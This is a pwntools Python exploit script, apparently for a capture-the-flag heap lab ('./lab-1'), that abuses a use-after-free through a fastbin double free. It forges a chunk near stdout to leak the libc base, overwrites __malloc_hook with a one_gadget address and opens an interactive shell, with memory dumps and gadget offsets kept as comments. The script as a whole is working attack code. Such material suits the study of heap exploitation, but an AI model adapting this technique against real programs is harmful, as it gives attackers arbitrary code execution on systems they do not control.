from pwn import *
from time import *
from termcolor import *
# hole: UAF, use after free




def alloc(size,data):
	r.sendafter('> ','1')
	r.sendafter('size: ',str(size))
	r.sendafter('content: ',str(data))

def get(idx):
	r.sendafter('> ','2')
	r.sendafter('index: ',str(idx))
	return r.recvline()[:-1]
def delete(idx):
	r.sendafter('> ','3')
	r.sendafter('index: ',str(idx))
context.arch = 'amd64'
r = process('./lab-1')

# r = remote('csie.ctf.tw',10133)
# raw_input('wait')

alloc(0x68, 'a')
alloc(0x68, 'a')
delete(0)
delete(1)
delete(0)
# malloc 0, malloc 1, free 0, free 1, free 0

# Find where place has "0x70" size. 
# Because fastbin will check size. 

'''
0x601ff5:	0x620830803000007f	0x000000000000007f <- good to use.
0x602005:	0x0000000000000000	0x0000000000000000
0x602015:	0x0000000000000000	0x6208693620000000
0x602025 <stdout@@GLIBC_2.2.5+5>:	0x000000000000007f	0x62086928e0000000
0x602035 <stdin@@GLIBC_2.2.5+5>:	0x000000000000007f	0x0001374010000000
0x602045 <note+5>:	0x0001374080000000	0x0000000000000000
0x602055 <note+21>:	0x0000000000000000	0x0000000000000000
0x602065 <note+37>:	0x0000000000000000	0x0000000000000000
----------------------------------------------------------------------------
0x601ff0:	0x00007fdf28788e80	0x00007fdf2878c030
0x602000:	0x4141410000000000	0x00000000000a4141
0x602010:	0x0000000000000000	0x0000000000000000
0x602020 <stdout@@GLIBC_2.2.5>:	0x00007fdf28b17620	0x0000000000000000
0x602030 <stdin@@GLIBC_2.2.5>:	0x00007fdf28b168e0	0x0000000000000000

'''

fake_bin_address = 0x601ff5
alloc(0x68,p64(fake_bin_address))
alloc(0x68,'a')
alloc(0x68,'a')
alloc(0x68,'|||'+'|'*0x18)
# write | *27 to fake_bin_address.

#  803: 00000000003c4620   224 OBJECT  GLOBAL DEFAULT   33 _IO_2_1_stdout_@@GLIBC_2.2.5
# ?????
#   1043: 00000000003c4708     8 OBJECT  GLOBAL DEFAULT   33 stdout@@GLIBC_2.2.5

# 1088: 00000000003c3b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook@@GLIBC_2.2.5	

stdout_offset = 0x3c4620 
malloc_hook_offset = 0x3c3b10
libc_base = u64(get(5).split('|')[-1].ljust(8,'\x00')) - stdout_offset
malloc_hook = libc_base + malloc_hook_offset - 0x28 + 0x5
print(colored(('{: <10s}: %x' %libc_base).format('libc_base'),'red'))

''' one gadget
0x45216 rax == NULL
0x4526a	[rsp+0x30] == NULL
0xef6c4	[rsp+0x50] == NULL
0xf0567	[rsp+0x70] == NULL
'''
raw_input('xx')
one_gadget = libc_base + 0xef6c4
delete(0)
delete(1)
delete(0)
alloc(0x68,p64(malloc_hook))
alloc(0x68,'a')
alloc(0x68,'a')
alloc(0x68,'|||'+'|'*0x10+p64(one_gadget))
delete(0)
delete(0)
# write | *27 to fake_bin_address.


# malloc 2(to 0), malloc 3(to 1), malloc 
# p = r.recv().split('index:')[-1].split('\n')[0]
# for c in p:
	# print(hex(ord(c)))
# print(hex(__libc_start_main_GOT))
r.interactive()
# 24 40
